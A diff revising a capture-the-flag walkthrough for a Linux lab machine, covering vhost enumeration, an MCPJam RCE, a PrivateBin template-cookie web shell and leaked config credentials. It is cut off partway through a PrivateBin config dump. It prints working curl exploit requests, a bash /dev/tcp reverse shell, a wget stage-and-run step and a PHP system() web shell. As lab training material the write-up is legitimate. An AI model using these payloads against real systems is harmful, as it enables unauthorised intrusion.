@@ -1,21 +1,20 @@
-
-| Property                                                                                      | Value        |
-| --------------------------------------------------------------------------------------------- | ------------ |
-| **OS**                                                                                        | Lin          |
-| **Difficulty**                                                                                | E            |
-| **Release Date**                                                                              | 2026-0       |
-| **State**                                                                                     | A            |
-| **IP**                                                                                        | 10.129       |
-| **Technique vhost enumeration, mcp rce, docker (add all the actual tecniques i missed) p rce, |              |
-| **Tags**                                                                                      | #web #prives |
+| Property       | Value                                                                                                                            |
+| -------------- | -------------------------------------------------------------------------------------------------------------------------------- |
+| **OS**         | Linux                                                                                                                            |
+| **Difficulty** | Easy                                                                                                                             |
+| **Release**    | 2026-03-21                                                                                                                       |
+| **State**      | Active                                                                                                                           |
+| **IP**         | 10.129.58.91                                                                                                                     |
+| **Techniques** | vhost enumeration, MCP RCE, group-based write abuse, LFI via template injection, credentials disclosure, Docker container escape |
+| **Tags**       | #web #privesc #linux #docker #mcp                                                                                                |
 
 ---
 ## Summary
 
-Kobold is a easy Linux machine, which is running an Arcane web application on port 3552. Enumeration leads to the discovery of two vhosts (bin and mcp). The mcp vhost is running a MCPJam instance vulnerable to RCE, which is leveraged to gain a reverse shell and get user access as ben.
-Ben is part of the operators group, which has privileges (?) over the privatebin-data folder, ultimately a subdirectory is world writeable and can be used to spawn a web shell to the privatebin instance. The configuration file contains plaintext credentials which are used to access the acrane application with the user arcane (default). The arcane user can create a new container that is used to import the file system into the container and access it as root.
+Kobold is an easy Linux machine hosting an Arcane Docker management interface on port 3552.
+Virtual host enumeration reveals two subdomains: `bin.kobold.htb`, running a PrivateBin instance, and `mcp.kobold.htb`, running MCPJam v1.4.2, which is vulnerable to an unauthenticated RCE (GHSA-232v-j27c-5pp6). The vulnerability is exploited to gain a reverse shell as `ben`. `ben` belongs to the `operator` group, which has write access to a world-writable subdirectory inside the PrivateBin data folder. A PHP web shell can be written in the directory and accessed via PrivateBin's template cookie parameter, achieving code execution as `www-data`. The PrivateBin configuration file contains plaintext credentials that grant access to the Arcane instance. From Arcane, a new container is created with the host filesystem mounted, allowing arbitrary file read as root.
 
-**Note**: The machine has different ip addresses in the sections of the writeup because i started it multiple times.
+> **Note:** The machine has different IP addresses across sections of this writeup due to multiple restarts.
 
 ---
 ## Enumeration
@@ -24,18 +23,19 @@ Ben is part of the operators group, which has privileges (?) over the privatebin
 echo '10.129.58.91 kobold.htb' | sudo tee -a /etc/hosts
 ```
 
-Added the ip address to the /etc/host file 
+Added the IP address of the machine to the `/etc/hosts` file.
+
 ### Nmap Scan
 
 ```
-sudo nmap -sV -sC kobold.htb    
+sudo nmap -sV -sC kobold.htb
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-06 05:36 EDT
 Nmap scan report for kobold.htb (10.129.58.91)
 Host is up (0.044s latency).
 Not shown: 997 closed tcp ports (reset)
 PORT    STATE SERVICE  VERSION
 22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
 |_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
 80/tcp  open  http     nginx 1.24.0 (Ubuntu)
@@ -44,885 +44,251 @@ PORT    STATE SERVICE  VERSION
 443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
 |_ssl-date: TLS randomness does not represent time
 |_http-server-header: nginx/1.24.0 (Ubuntu)
-| tls-alpn: 
-|   http/1.1
-|   http/1.0
-|_  http/0.9
 |_http-title: Kobold Operations Suite
 | ssl-cert: Subject: commonName=kobold.htb
 | Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
 | Not valid before: 2026-03-15T15:08:55
 |_Not valid after:  2125-02-19T15:08:55
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 18.65 seconds
 ```
 
 ```
-sudo nmap -p- kobold.htb        
-[sudo] password for kali: 
-Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-06 05:36 EDT
-Nmap scan report for kobold.htb (10.129.58.91)
-Host is up (0.044s latency).
-Not shown: 65531 closed tcp ports (reset)
+sudo nmap -p- kobold.htb
 PORT     STATE SERVICE
 22/tcp   open  ssh
 80/tcp   open  http
 443/tcp  open  https
 3552/tcp open  taserver
-
 ```
+
 ### Service Enumeration
 
-The port 3552 is hosting an Arcane instance, an interface for managing Docker containers, images, networks, and volumes.
+Port 3552 hosts an Arcane instance, a web UI for managing Docker containers, images, networks, and volumes.
 
-IMAGE 1
+Mostra immagine
 
-Vhost discovery 
+**Virtual host discovery:**
 
 ```
-ffuf -w /home/kali/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u https://10.129.59.28 -H 'Host: FUZZ.kobold.htb' -fs 154
+ffuf -w /home/kali/SecLists/Discovery/DNS/subdomains-top1million-20000.txt \
+  -u https://10.129.59.28 \
+  -H 'Host: FUZZ.kobold.htb' \
+  -fs 154
 
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
-
-       v2.1.0-dev
-________________________________________________
-
- :: Method           : GET
- :: URL              : https://10.129.59.28
- :: Wordlist         : FUZZ: /home/kali/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
- :: Header           : Host: FUZZ.kobold.htb
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
- :: Filter           : Response size: 154
-________________________________________________
-
-mcp                     [Status: 200, Size: 466, Words: 57, Lines: 15, Duration: 33ms]
-bin                     [Status: 200, Size: 24402, Words: 1218, Lines: 386, Duration: 102ms]
-:: Progress: [19966/19966] :: Job [1/1] :: 1298 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
+mcp   [Status: 200, Size: 466,   Words: 57,   Lines: 15,  Duration: 33ms]
+bin   [Status: 200, Size: 24402, Words: 1218, Lines: 386, Duration: 102ms]
 ```
 
 ```
-┌──(kali㉿kali)-[~]
-└─$ echo '10.129.59.28 bin.kobold.htb' | sudo tee -a /etc/hosts                                                                          
-[sudo] password for kali: 
-10.129.59.28 bin.kobold.htb
-                                                                                                                                                                                                                                 
-┌──(kali㉿kali)-[~]
-└─$ echo '10.129.59.28 mcp.kobold.htb' | sudo tee -a /etc/hosts
-10.129.59.28 mcp.kobold.htb
-
+echo '10.129.59.28 bin.kobold.htb' | sudo tee -a /etc/hosts
+echo '10.129.59.28 mcp.kobold.htb' | sudo tee -a /etc/hosts
 ```
 
-MCPJam Version: v1.4.2 is vulnerable to RCE:
-Poc: https://github.com/advisories/GHSA-232v-j27c-5pp6
+`bin.kobold.htb` hosts a PrivateBin instance. `mcp.kobold.htb` hosts MCPJam v1.4.2, which is vulnerable to unauthenticated RCE.
 
-IMAGE 2
+Mostra immagine
 
 ---
-## Foothold
-### Vulnerability
 
-Versions 1.4.2 and earlier are vulnerable to remote code execution (RCE) vulnerability, which allows an attacker to send a crafted HTTP request that triggers the installation of an MCP server, leading to RCE.
-Since MCPJam inspector by default listens on 0.0.0.0 instead of 127.0.0.1, an attacker can trigger the RCE remotely via a simple HTTP request.
-The `/api/mcp/connect` API, which is intended for connecting to MCP servers, becomes an open entry point for unauthorized requests. When an HTTP request reaches the `/connect` route, the system extracts the `command` and `args` fields without performing any security checks, leading to the execution of arbitrary command.
+## Foothold
+
+### GHSA-232v-j27c-5pp6 — MCPJam Unauthenticated RCE
+
+MCPJam v1.4.2 and earlier are vulnerable to remote code execution. The `/api/mcp/connect` endpoint extracts the `command` and `args` fields from the request body and passes them directly to the system without any authentication or input validation. Because the MCPJam inspector binds on `0.0.0.0` by default instead of `127.0.0.1`, the endpoint is reachable remotely.
 
 ### Exploitation
 
+Confirming the vulnerability with an outbound connection:
 
-```
+shell
+
+```shell
 curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
   -H "Content-Type: application/json" \
   -d '{"serverConfig":{"command":"wget","args":["http://10.10.14.224:1111"],"env":{}},"serverId":"1"}'
 ```
 
-Testing for RCE.
-
 ```
-nc -lvnp 1111      
-listening on [any] 1111 ...
+nc -lvnp 1111
 connect to [10.10.14.224] from (UNKNOWN) [10.129.60.161] 54326
 GET / HTTP/1.1
 Host: 10.10.14.224:1111
 User-Agent: Wget/1.21.4
-Accept: */*
-Accept-Encoding: identity
-Connection: Keep-Alive
-
 ```
 
-The listener gets the request back thus confirming the vulerability.
+The listener receives the request, confirming code execution. A reverse shell is obtained by staging a bash script and executing it via two subsequent requests:
 
+shell
 
----
-## User Flag
-
-A shell as the user ben can be achieved by leveraging the vulnerability:
-
-```
-
-cat shell.sh                        
+```shell
+cat shell.sh
 #!/bin/bash
 bash -i >& /dev/tcp/10.10.14.224/1111 0>&1
-                                                                                                               
-python3 -m http.server 8000                         
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
-10.129.59.28 - - [06/May/2026 18:44:27] "GET /shell.sh HTTP/1.1" 200 -
+
+python3 -m http.server 8000
 ```
 
-```
+shell
+
+```shell
+# Stage the shell script on the target
 curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
   -H "Content-Type: application/json" \
   -d '{"serverConfig":{"command":"wget","args":["-O","/tmp/shell.sh","http://10.10.14.224:8000/shell.sh"],"env":{}},"serverId":"1"}'
-  
-```
 
-```
+# Execute it
 curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
   -H "Content-Type: application/json" \
   -d '{"serverConfig":{"command":"bash","args":["/tmp/shell.sh"],"env":{}},"serverId":"1"}'
 ```
 
 ```
- nc -lvnp 1111      
-listening on [any] 1111 ...
+nc -lvnp 1111
 connect to [10.10.14.224] from (UNKNOWN) [10.129.60.161] 53162
-bash: cannot set terminal process group (1530): Inappropriate ioctl for device
-bash: no job control in this shell
 ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ id
-id
 uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
-ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ 
 ```
 
-**User Flag:**
+Shell obtained as `ben`. Upgraded to a full interactive TTY:
+
+shell
+
+```shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+---
+
+## User Flag
 
 ```
 ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ cat /home/ben/user.txt
-<e_modules/@mcpjam/inspector$ cat /home/ben/user.txt      
 0d9673a3692aa1a3e0631255bdfa9dca
 ```
 
 ---
+
 ## Privilege Escalation
 
 ### Enumeration
 
-enumerate group operator:
+Enumerating files owned by the `operator` group:
 
-```
-ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ find / -group operator  
-<e_modules/@mcpjam/inspector$ find / -group operator      
+shell
+
+```shell
+ben@kobold:~$ find / -group operator 2>/dev/null
 /privatebin-data
 /privatebin-data/certs
 /privatebin-data/certs/key.pem
 /privatebin-data/certs/cert.pem
-find: '/privatebin-data/cfg': Permission denied
 /privatebin-data/data
 /privatebin-data/data/purge_limiter.php
 /privatebin-data/data/bd
 /privatebin-data/data/bd/b5
 /privatebin-data/data/.htaccess
 /privatebin-data/data/e3
-
 ```
 
-World writable directory b5 can be used to upload a .php shell accessible from bin.kobold.htb by changing the template cookie (i think its a cookie?)
+The `bd/b5` subdirectory is world-writable and falls within the PrivateBin data directory:
 
-```
+shell
+
+```shell
 ben@kobold:/privatebin-data/data/bd$ ls -la
-ls -la
 total 12
 drwxrwxrwx 3 root operator 4096 Mar 15 21:23 .
 drwxrwxrwx 5 root operator 4096 Mar 15 21:23 ..
 drwxrwxrwx 2 root operator 4096 Mar 15 21:23 b5
-
 ```
 
-```
+### Web Shell via Template Cookie Injection
+
+PrivateBin's template selection feature uses a session cookie (`template`) to load a PHP template file from the `tpl/` directory. The path is not sanitized, allowing traversal into arbitrary directories. A PHP web shell dropped into `bd/b5/` can be loaded by pointing the cookie at that path.
+
+shell
+
+```shell
 ben@kobold:/privatebin-data/data/bd/b5$ echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
 ```
 
-IMAGE 3
+Verifying execution via curl:
 
-IMAGE 4
+shell
 
-curl alternative:
-
-```
- curl -k https://bin.kobold.htb/ \                    
+```shell
+curl -k https://bin.kobold.htb/ \
   -b "template=../data/bd/b5/shell" \
   -G --data-urlencode "cmd=id"
+
 uid=65534(nobody) gid=82(www-data) groups=82(www-data)
 ```
 
-### Credentials disclosure
+Mostra immagine
 
-a password can be found in the default directory of private bin configuration file.
+Mostra immagine
 
-```
- curl -k https://bin.kobold.htb/ \
+### Credentials Disclosure
+
+Reading the PrivateBin configuration file through the web shell:
+
+shell
+
+```shell
+curl -k https://bin.kobold.htb/ \
   -b "template=../data/bd/b5/shell" \
   -G --data-urlencode "cmd=cat /srv/cfg/conf.php"
 ```
 
+The configuration file contains a commented-out MySQL model section with plaintext credentials:
 
-```
-;<?php http_response_code(403); /*
-; config file for PrivateBin
-;
-; An explanation of each setting can be find online at https://github.com/PrivateBin/PrivateBin/wiki/Configuration.
+ini
 
-[main]
-; (optional) set a project name to be displayed on the website
-; name = "PrivateBin"
-
-; The full URL, with the domain name and directories that point to the
-; PrivateBin files, including an ending slash (/). This URL is essential to
-; allow Opengraph images to be displayed on social networks.
-; basepath = "https://privatebin.example.com/"
-
-; enable or disable the discussion feature, defaults to true
-discussion = true
-
-; preselect the discussion feature, defaults to false
-opendiscussion = false
-
-; enable or disable the display of dates & times in the comments, defaults to true
-; Note that internally the creation time will still get tracked in order to sort
-; the comments by creation time, but you can choose not to display them.
-; discussiondatedisplay = false
-
-; enable or disable the password feature, defaults to true
-password = true
-
-; enable or disable the file upload feature, defaults to false
-fileupload = false
-
-; preselect the burn-after-reading feature, defaults to false
-burnafterreadingselected = false
-
-; which display mode to preselect by default, defaults to "plaintext"
-; make sure the value exists in [formatter_options]
-defaultformatter = "plaintext"
-
-; (optional) set a syntax highlighting theme, as found in css/prettify/
-; syntaxhighlightingtheme = "sons-of-obsidian"
-
-; size limit per document or comment in bytes, defaults to 10 Megabytes
-sizelimit = 10000000
-
-; by default PrivateBin use "bootstrap5" template (tpl/bootstrap5.php).
-; Optionally you can enable the template selection menu, which uses
-; a session cookie to store the choice until the browser is closed.
-templateselection = true
-
-; List of available for selection templates when "templateselection" option is enabled
-availabletemplates[] = "bootstrap5"
-availabletemplates[] = "bootstrap"
-availabletemplates[] = "bootstrap-page"
-availabletemplates[] = "bootstrap-dark"
-availabletemplates[] = "bootstrap-dark-page"
-availabletemplates[] = "bootstrap-compact"
-availabletemplates[] = "bootstrap-compact-page"
-
-; set the template your installs defaults to, defaults to "bootstrap5" (tpl/bootstrap5.php), also
-; bootstrap template (tpl/bootstrap.php) and it's variants: "bootstrap-dark", "bootstrap-compact", "bootstrap-page",
-; which can be combined with "-dark" and "-compact" for "bootstrap-dark-page",
-; "bootstrap-compact-page" - previews at:
-; https://privatebin.info/screenshots.html
-; template = "bootstrap5"
-
-; (optional) info text to display
-; use single, instead of double quotes for HTML attributes
-;info = "More information on the <a href='https://privatebin.info/'>project page</a>."
-
-; (optional) notice to display
-; notice = "Note: This is a test service: Data may be deleted anytime. Kittens will die if you abuse this service."
-
-; by default PrivateBin will guess the visitors language based on the browsers
-; settings. Optionally you can enable the language selection menu, which uses
-; a session cookie to store the choice until the browser is closed.
-languageselection = false
-
-; set the language your installs defaults to, defaults to English
-; if this is set and language selection is disabled, this will be the only language
-; languagedefault = "en"
-
-; (optional) URL shortener address to offer after a new document is created.
-; It is suggested to only use this with self-hosted shorteners as this will leak
-; the documents encryption key.
-; urlshortener = "https://shortener.example.com/api?link="
-
-; (optional) Whether to shorten the URL by default when a new document is created.
-; If set to true, the "Shorten URL" functionality will be automatically called.
-; This only works if the "urlshortener" option is set.
-; shortenbydefault = false
-
-; (optional) Let users create a QR code for sharing the document URL with one click.
-; It works both when a new document is created and when you view a document.
-; qrcode = true
-
-; (optional) Let users send an email sharing the document URL with one click.
-; It works both when a new document is created and when you view a document.
-; email = true
-
-; (optional) IP based icons are a weak mechanism to detect if a comment was from
-; a different user when the same username was used in a comment. It might get
-; used to get the IP of a comment poster if the server salt is leaked and a
-; SHA512 HMAC rainbow table is generated for all (relevant) IPs.
-; Can be set to one these values:
-; "none" / "identicon" / "jdenticon" (default) / "vizhash".
-; icon = "none"
-
-; Content Security Policy headers allow a website to restrict what sources are
-; allowed to be accessed in its context. You need to change this if you added
-; custom scripts from third-party domains to your templates, e.g. tracking
-; scripts or run your site behind certain DDoS-protection services.
-; Check the documentation at https://content-security-policy.com/
-; Notes:
-; - By default this disallows to load images from third-party servers, e.g. when
-;   they are embedded in documents. If you wish to allow that, you can adjust the
-;   policy here. See https://github.com/PrivateBin/PrivateBin/wiki/FAQ#why-does-not-it-load-embedded-images
-;   for details.
-; - The 'wasm-unsafe-eval' is used to enable webassembly support (used for zlib
-;   compression). You can remove it if compression doesn't need to be supported.
-; - The 'unsafe-inline' style-src is used by Chrome when displaying PDF previews
-;   and can be omitted if attachment upload is disabled (which is the default).
-;   See https://issues.chromium.org/issues/343754409
-; - To allow displaying PDF previews in Firefox or Chrome, sandboxing must also
-;   get turned off. The following CSP allows PDF previews:
-; cspheader = "default-src 'none'; base-uri 'self'; form-action 'none'; manifest-src 'self'; connect-src * blob:; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; font-src 'self'; frame-ancestors 'none'; frame-src blob:; img-src 'self' data: blob:; media-src blob:; object-src blob:"
-;
-; The recommended and default used CSP is:
-; cspheader = "default-src 'none'; base-uri 'self'; form-action 'none'; manifest-src 'self'; connect-src * blob:; script-src 'self' 'wasm-unsafe-eval'; style-src 'self'; font-src 'self'; frame-ancestors 'none'; frame-src blob:; img-src 'self' data: blob:; media-src blob:; object-src blob:; sandbox allow-same-origin allow-scripts allow-forms allow-modals allow-downloads"
-
-; Enable or disable the warning message when the site is served over an insecure
-; connection (insecure HTTP instead of HTTPS), defaults to true.
-; Secure transport methods like Tor and I2P domains are automatically whitelisted.
-; It is **strongly discouraged** to disable this.
-; See https://github.com/PrivateBin/PrivateBin/wiki/FAQ#why-does-it-show-me-an-error-about-an-insecure-connection for more information.
-; httpwarning = true
-
-; Pick compression algorithm or disable it. Only applies to documents & comments
-; created after changing the setting.
-; Can be set to one these values: "none" / "zlib" (default).
-; compression = "zlib"
-
-[expire]
-; expire value that is selected per default
-; make sure the value exists in [expire_options]
-default = "1week"
-
-[expire_options]
-; Set each one of these to the number of seconds in the expiration period,
-; or 0 if it should never expire
-5min = 300
-10min = 600
-1hour = 3600
-1day = 86400
-1week = 604800
-; Well this is not *exactly* one month, it's 30 days:
-1month = 2592000
-1year = 31536000
-never = 0
-
-[formatter_options]
-; Set available formatters, their order and their labels
-plaintext = "Plain Text"
-syntaxhighlighting = "Source Code"
-markdown = "Markdown"
-
-[traffic]
-; time limit between calls from the same IP address in seconds
-; Set this to 0 to disable rate limiting.
-limit = 10
-
-; (optional) Set IPs addresses (v4 or v6) or subnets (CIDR) which are exempted
-; from the rate-limit. Invalid IPs will be ignored. If multiple values are to
-; be exempted, the list needs to be comma separated. Leave unset to disable
-; exemptions.
-; exempted = "1.2.3.4,10.10.10/24"
-
-; (optional) If you want only some source IP addresses (v4 or v6) or subnets
-; (CIDR) to be allowed to create documents, set these here. Invalid IPs will be
-; ignored. If multiple values are to be exempted, the list needs to be comma
-; separated. Leave unset to allow anyone to create documents.
-; creators = "1.2.3.4,10.10.10/24"
-
-; (optional) if your website runs behind a reverse proxy or load balancer,
-; set the HTTP header containing the visitors IP address, i.e. X_FORWARDED_FOR
-; header = "X_FORWARDED_FOR"
-
-[purge]
-; minimum time limit between two purgings of expired documents, it is only
-; checked when documents get created
-; Set this to 0 to run a purge every time a document is created.
-limit = 300
-
-; maximum amount of expired documents to delete in one purge
-; Set this to 0 to disable purging. Set it higher, if you are running a large
-; site
-batchsize = 10
-
+```ini
 [model]
-; name of data model class to load and directory for storage
-; the default model "Filesystem" stores everything in the filesystem
-class = Filesystem
-[model_options]
-dir = PATH "data"
-
-;[model]
-; example of a Google Cloud Storage configuration
-;class = GoogleCloudStorage
-;[model_options]
-;bucket = "my-private-bin"
-;prefix = "pastes"
-;uniformacl = false
-
-;[model]
-; example of DB configuration for MySQL
-;class = Database
-;[model_options]
-;dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"
-;tbl = "privatebin_"    ; table prefix
-;usr = "privatebin"
-;pwd = "Z3r0P4ss"
-;opt[12] = true   ; PDO::ATTR_PERSISTENT
-
-;[model]
-; example of DB configuration for SQLite
-;class = Database
-;[model_options]
-;dsn = "sqlite:" PATH "data/db.sq3"
-;usr = null
-;pwd = null
-;opt[12] = true ; PDO::ATTR_PERSISTENT
-
-;[model]
-; example of DB configuration for PostgreSQL
-;class = Database
-;[model_options]
-;dsn = "pgsql:host=localhost;dbname=privatebin"
-;tbl = "privatebin_"     ; table prefix
-;usr = "privatebin"
-;pwd = "Z3r0P4ss"
-;opt[12] = true    ; PDO::ATTR_PERSISTENT
-
-;[model]
-; example of S3 configuration for Rados gateway / CEPH
-;class = S3Storage
-;[model_options]
-;region = ""
-;version = "2006-03-01"
-;endpoint = "https://s3.my-ceph.invalid"
-;use_path_style_endpoint = true
-;bucket = "my-bucket"
-;accesskey = "my-rados-user"
-;secretkey = "my-rados-pass"
-
-;[model]
-; example of S3 configuration for AWS
-;class = S3Storage
-;[model_options]
-;region = "eu-central-1"
-;version = "latest"
-;bucket = "my-bucket"
-;accesskey = "access key id"
-;secretkey = "secret access key"
-
-;[model]
-; example of S3 configuration for AWS using its SDK default credential provider chain
-; if relying on environment variables, the AWS SDK will look for the following:
-; - AWS_ACCESS_KEY_ID
-; - AWS_SECRET_ACCESS_KEY
-; - AWS_SESSION_TOKEN (if needed)
-; for more details, see https://docs.aws.amazon.com/sdk-for-php/v3/developer-guide/guide_credentials.html#default-credential-chain
-;class = S3Storage
-;[model_options]
-;region = "eu-central-1"
-;version = "latest"
-;bucket = "my-bucket"
-
-;[shlink]
-; - Shlink requires you to make a post call with a generated API key.
-;   use this section to setup the API key and URL. In order to use this section,
-;   "urlshortener" needs to point to the base URL of your PrivateBin
-;   instance with "?shortenviashlink&link=" appended. For example:
-;   urlshortener = "${basepath}?shortenviashlink&link="
-;   This URL will in turn call Shlink on the server side, using the URL from
-;   "apiurl" and the API Key from the "apikey" parameters below.
-; apiurl = "https://shlink.example.com/rest/v3/short-urls"
-; apikey = "your_api_key"
-
-;[yourls]
-; When using YOURLS as a "urlshortener" config item:
-; - By default, "urlshortener" will point to the YOURLS API URL, with or without
-;   credentials, and will be visible in public on the PrivateBin web page.
-;   Only use this if you allow short URL creation without credentials.
-; - Alternatively, using the parameters in this section ("signature" and
-;   "apiurl"), "urlshortener" needs to point to the base URL of your PrivateBin
-;   instance with "?shortenviayourls&link=" appended. For example:
-;   urlshortener = "${basepath}?shortenviayourls&link="
-;   This URL will in turn call YOURLS on the server side, using the URL from
-;   "apiurl" and the "access signature" from the "signature" parameters below.
-
-; (optional) the "signature" (access key) issued by YOURLS for the using account
-; signature = ""
-; (optional) the URL of the YOURLS API, called to shorten a PrivateBin URL
-; apiurl = "https://yourls.example.com/yourls-api.php"
-
-;[sri]
-; Subresource integrity (SRI) hashes used in template files. Uncomment and set
-; these for all js files used. See:
-; https://github.com/PrivateBin/PrivateBin/wiki/FAQ#user-content-how-to-make-privatebin-work-when-i-have-changed-some-javascript-files
-;js/privatebin.js = "sha512-[…]"
-
-;<?php http_response_code(403); /*
-; config file for PrivateBin
-;
-; An explanation of each setting can be find online at https://github.com/PrivateBin/PrivateBin/wiki/Configuration.
-
-[main]
-; (optional) set a project name to be displayed on the website
-; name = "PrivateBin"
-
-; The full URL, with the domain name and directories that point to the
-; PrivateBin files, including an ending slash (/). This URL is essential to
-; allow Opengraph images to be displayed on social networks.
-; basepath = "https://privatebin.example.com/"
-
-; enable or disable the discussion feature, defaults to true
-discussion = true
-
-; preselect the discussion feature, defaults to false
-opendiscussion = false
-
-; enable or disable the display of dates & times in the comments, defaults to true
-; Note that internally the creation time will still get tracked in order to sort
-; the comments by creation time, but you can choose not to display them.
-; discussiondatedisplay = false
-
-; enable or disable the password feature, defaults to true
-password = true
-
-; enable or disable the file upload feature, defaults to false
-fileupload = false
-
-; preselect the burn-after-reading feature, defaults to false
-burnafterreadingselected = false
-
-; which display mode to preselect by default, defaults to "plaintext"
-; make sure the value exists in [formatter_options]
-defaultformatter = "plaintext"
-
-; (optional) set a syntax highlighting theme, as found in css/prettify/
-; syntaxhighlightingtheme = "sons-of-obsidian"
-
-; size limit per document or comment in bytes, defaults to 10 Megabytes
-sizelimit = 10000000
-
-; by default PrivateBin use "bootstrap5" template (tpl/bootstrap5.php).
-; Optionally you can enable the template selection menu, which uses
-; a session cookie to store the choice until the browser is closed.
-templateselection = true
-
-; List of available for selection templates when "templateselection" option is enabled
-availabletemplates[] = "bootstrap5"
-availabletemplates[] = "bootstrap"
-availabletemplates[] = "bootstrap-page"
-availabletemplates[] = "bootstrap-dark"
-availabletemplates[] = "bootstrap-dark-page"
-availabletemplates[] = "bootstrap-compact"
-availabletemplates[] = "bootstrap-compact-page"
-
-; set the template your installs defaults to, defaults to "bootstrap5" (tpl/bootstrap5.php), also
-; bootstrap template (tpl/bootstrap.php) and it's variants: "bootstrap-dark", "bootstrap-compact", "bootstrap-page",
-; which can be combined with "-dark" and "-compact" for "bootstrap-dark-page",
-; "bootstrap-compact-page" - previews at:
-; https://privatebin.info/screenshots.html
-; template = "bootstrap5"
-
-; (optional) info text to display
-; use single, instead of double quotes for HTML attributes
-;info = "More information on the <a href='https://privatebin.info/'>project page</a>."
-
-; (optional) notice to display
-; notice = "Note: This is a test service: Data may be deleted anytime. Kittens will die if you abuse this service."
-
-; by default PrivateBin will guess the visitors language based on the browsers
-; settings. Optionally you can enable the language selection menu, which uses
-; a session cookie to store the choice until the browser is closed.
-languageselection = false
-
-; set the language your installs defaults to, defaults to English
-; if this is set and language selection is disabled, this will be the only language
-; languagedefault = "en"
-
-; (optional) URL shortener address to offer after a new document is created.
-; It is suggested to only use this with self-hosted shorteners as this will leak
-; the documents encryption key.
-; urlshortener = "https://shortener.example.com/api?link="
-
-; (optional) Whether to shorten the URL by default when a new document is created.
-; If set to true, the "Shorten URL" functionality will be automatically called.
-; This only works if the "urlshortener" option is set.
-; shortenbydefault = false
-
-; (optional) Let users create a QR code for sharing the document URL with one click.
-; It works both when a new document is created and when you view a document.
-; qrcode = true
-
-; (optional) Let users send an email sharing the document URL with one click.
-; It works both when a new document is created and when you view a document.
-; email = true
-
-; (optional) IP based icons are a weak mechanism to detect if a comment was from
-; a different user when the same username was used in a comment. It might get
-; used to get the IP of a comment poster if the server salt is leaked and a
-; SHA512 HMAC rainbow table is generated for all (relevant) IPs.
-; Can be set to one these values:
-; "none" / "identicon" / "jdenticon" (default) / "vizhash".
-; icon = "none"
-
-; Content Security Policy headers allow a website to restrict what sources are
-; allowed to be accessed in its context. You need to change this if you added
-; custom scripts from third-party domains to your templates, e.g. tracking
-; scripts or run your site behind certain DDoS-protection services.
-; Check the documentation at https://content-security-policy.com/
-; Notes:
-; - By default this disallows to load images from third-party servers, e.g. when
-;   they are embedded in documents. If you wish to allow that, you can adjust the
-;   policy here. See https://github.com/PrivateBin/PrivateBin/wiki/FAQ#why-does-not-it-load-embedded-images
-;   for details.
-; - The 'wasm-unsafe-eval' is used to enable webassembly support (used for zlib
-;   compression). You can remove it if compression doesn't need to be supported.
-; - The 'unsafe-inline' style-src is used by Chrome when displaying PDF previews
-;   and can be omitted if attachment upload is disabled (which is the default).
-;   See https://issues.chromium.org/issues/343754409
-; - To allow displaying PDF previews in Firefox or Chrome, sandboxing must also
-;   get turned off. The following CSP allows PDF previews:
-; cspheader = "default-src 'none'; base-uri 'self'; form-action 'none'; manifest-src 'self'; connect-src * blob:; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; font-src 'self'; frame-ancestors 'none'; frame-src blob:; img-src 'self' data: blob:; media-src blob:; object-src blob:"
-;
-; The recommended and default used CSP is:
-; cspheader = "default-src 'none'; base-uri 'self'; form-action 'none'; manifest-src 'self'; connect-src * blob:; script-src 'self' 'wasm-unsafe-eval'; style-src 'self'; font-src 'self'; frame-ancestors 'none'; frame-src blob:; img-src 'self' data: blob:; media-src blob:; object-src blob:; sandbox allow-same-origin allow-scripts allow-forms allow-modals allow-downloads"
-
-; Enable or disable the warning message when the site is served over an insecure
-; connection (insecure HTTP instead of HTTPS), defaults to true.
-; Secure transport methods like Tor and I2P domains are automatically whitelisted.
-; It is **strongly discouraged** to disable this.
-; See https://github.com/PrivateBin/PrivateBin/wiki/FAQ#why-does-it-show-me-an-error-about-an-insecure-connection for more information.
-; httpwarning = true
-
-; Pick compression algorithm or disable it. Only applies to documents & comments
-; created after changing the setting.
-; Can be set to one these values: "none" / "zlib" (default).
-; compression = "zlib"
-
-[expire]
-; expire value that is selected per default
-; make sure the value exists in [expire_options]
-default = "1week"
-
-[expire_options]
-; Set each one of these to the number of seconds in the expiration period,
-; or 0 if it should never expire
-5min = 300
-10min = 600
-1hour = 3600
-1day = 86400
-1week = 604800
-; Well this is not *exactly* one month, it's 30 days:
-1month = 2592000
-1year = 31536000
-never = 0
-
